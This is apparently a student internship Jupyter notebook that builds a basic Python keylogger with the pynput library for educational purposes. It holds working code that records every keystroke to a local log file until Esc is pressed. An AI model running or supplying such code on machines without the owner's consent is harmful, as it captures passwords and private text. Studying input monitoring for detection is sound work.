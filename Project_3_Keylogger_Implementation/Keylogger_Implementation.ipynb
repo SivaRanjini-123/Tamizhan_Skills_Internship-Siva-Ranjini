{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "e1a4f9d1-166d-49d2-a656-86e676aeda02",
   "metadata": {},
   "source": [
    "# Project 3: Keylogger Implementation (For Educational Purposes Only)\n",
    "\n",
    "# Problem Statement:\n",
    "Understanding how keyloggers work is crucial for developing robust cybersecurity measures. By creating a basic keylogger, we can gain insights into how malicious software might capture keystrokes, which in turn helps in designing better detection and prevention strategies.\n",
    "\n",
    "# Objective:\n",
    "The primary objective of this project is to implement a simple keylogger using Python. This tool is developed purely for **ethical and educational demonstration purposes** to understand the underlying mechanisms. It is **strictly not intended for any illicit or harmful activities.**\n",
    "\n",
    "# Requirements:\n",
    "* **Python:** The core programming language.\n",
    "* **`pynput` library:** A cross-platform library to control and monitor input devices.\n",
    "* **File System Access:** To write the captured keystrokes to a log file.\n",
    "* **Ethical Disclaimer:** Emphasize the educational nature and discourage misuse.\n",
    "\n",
    "# Expected Outcome:\n",
    "A functional Python script that can capture and log keystrokes to a designated file. The output will demonstrate how such a tool operates, fostering a deeper understanding of input monitoring and its associated security implications."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "830f4b01-d688-4a94-9af5-ee82e578f296",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: pynput in c:\\anaconda3\\lib\\site-packages (1.8.1)\n",
      "Requirement already satisfied: six in c:\\anaconda3\\lib\\site-packages (from pynput) (1.16.0)\n",
      "pynput library installation check complete.\n"
     ]
    }
   ],
   "source": [
    "!pip install pynput\n",
    "print(\"pynput library installation check complete.\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3935ff20-0e8e-44e4-8818-d3c84c2e0973",
   "metadata": {},
   "source": [
    "# Library Imports and Configuration\n",
    "\n",
    "This section imports the `Listener` module from `pynput.keyboard` which is essential for capturing keyboard events. We also define the name of the file where the keystrokes will be logged."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "e71c7046-a1cc-4729-adc0-0d104384dff1",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Keylogger configured to save keystrokes to: keylog.txt\n"
     ]
    }
   ],
   "source": [
    "from pynput.keyboard import Listener,Key\n",
    "log_file = \"keylog.txt\"\n",
    "print(f\"Keylogger configured to save keystrokes to: {log_file}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4f9694e7-f7b1-45a4-80d0-7cc0bee6f73a",
   "metadata": {},
   "source": [
    "# Key Event Handlers\n",
    "\n",
    "We define two functions to handle keyboard events:\n",
    "* `on_press(key)`: This function is called every time a key is pressed. It attempts to write the pressed key to the log file. Special keys (like Space, Enter, Shift) are handled to be more readable in the log.\n",
    "* `on_release(key)`: This function is called every time a key is released. It includes a condition to stop the keylogger when the 'esc' (escape) key is released, providing a way to terminate the logging process safely."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "9bd86339-c722-4b56-8774-4c48681f3ab1",
   "metadata": {},
   "outputs": [],
   "source": [
    "def on_press(key):\n",
    "    \"\"\"Handles key press events and logs them to the file.\"\"\"\n",
    "    try:\n",
    "        # Convert special keys to string for logging (e.g., 'Key.space' to 'Space')\n",
    "        # Otherwise, directly log the character for alphanumeric keys\n",
    "        with open(log_file, \"a\") as f:\n",
    "            f.write(str(key).replace(\"'\", \"\") + '\\n') # Remove quotes from key names\n",
    "    except AttributeError:\n",
    "        # For special keys (like space, enter, shift, etc.)\n",
    "        with open(log_file, \"a\") as f:\n",
    "            if key == key.space:\n",
    "                f.write(' \\n') # Log a space for readability\n",
    "            elif key == key.enter:\n",
    "                f.write('[ENTER]\\n') # Log [ENTER]\n",
    "            elif key == key.tab:\n",
    "                f.write('[TAB]\\n') # Log [TAB]\n",
    "            elif key == key.backspace:\n",
    "                f.write('[BACKSPACE]\\n') # Log [BACKSPACE]\n",
    "            else:\n",
    "                f.write(f'[{key}]\\n') # Log other special keys like '[Key.shift_r]'\n",
    "\n",
    "def on_release(key):\n",
    "    \"\"\"Handles key release events and stops the listener on 'esc' key.\"\"\"\n",
    "    if key == Key.esc:\n",
    "        print(\"\\nEscape key pressed. Stopping keylogger.\")\n",
    "        # Stop listener\n",
    "        return False"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2f0d9f66-2e44-4e03-b527-f42e9c8675ac",
   "metadata": {},
   "source": [
    "# Starting the Keylogger Listener\n",
    "\n",
    "This section initiates the `Listener` object, which starts monitoring keyboard events. The `on_press` and `on_release` functions are assigned as callbacks. The `listener.join()` method keeps the main thread alive, allowing the keylogger to continuously capture inputs until the 'esc' key is pressed.\n",
    "\n",
    "**To stop the keylogger, simply press the 'Esc' key.** After pressing 'Esc', you can check the `keylog.txt` file in the same directory as this notebook to see the recorded keystrokes."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "47b60902-df8f-44bd-9242-ca36b4802bdf",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Keylogger started. Press 'Esc' to stop logging.\n",
      "Monitoring keystrokes... (You might need to click outside this cell to type and log)\n",
      "\n",
      "Escape key pressed. Stopping keylogger.\n",
      "Keylogger stopped.\n",
      "Keystrokes saved to 'keylog.txt'.\n"
     ]
    }
   ],
   "source": [
    "print(\"Keylogger started. Press 'Esc' to stop logging.\")\n",
    "print(\"Monitoring keystrokes... (You might need to click outside this cell to type and log)\")\n",
    "\n",
    "# Collect events until released\n",
    "with Listener(on_press=on_press, on_release=on_release) as listener:\n",
    "    try:\n",
    "        listener.join()\n",
    "    except Exception as e:\n",
    "        print(f\"An error occurred: {e}\")\n",
    "\n",
    "print(\"Keylogger stopped.\")\n",
    "print(f\"Keystrokes saved to '{log_file}'.\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "dd5ecb03-2a5c-42b4-8df8-dbc69d99c770",
   "metadata": {},
   "source": [
    "# Conceptual Output / Log File Content \n",
    "\n",
    "After running the keylogger and pressing the 'Esc' key to stop it, a file named `keylog.txt` will be created or updated in the same directory as this Jupyter Notebook. This file will contain the captured keystrokes.\n",
    "\n",
    "**Example `keylog.txt` content (demonstrative):**"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "895dc9bc-aacc-4984-939b-7c19928ce1b9",
   "metadata": {},
   "source": [
    "# Conclusion \n",
    "\n",
    "This project successfully implemented a basic keylogger using the `pynput` library in Python. The application demonstrates how keystrokes can be captured and logged to a file, providing valuable insight into the functionality of such tools. This exercise reinforces the importance of understanding input monitoring for cybersecurity awareness and highlights the need for robust security practices to protect against unauthorized data capture. "
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
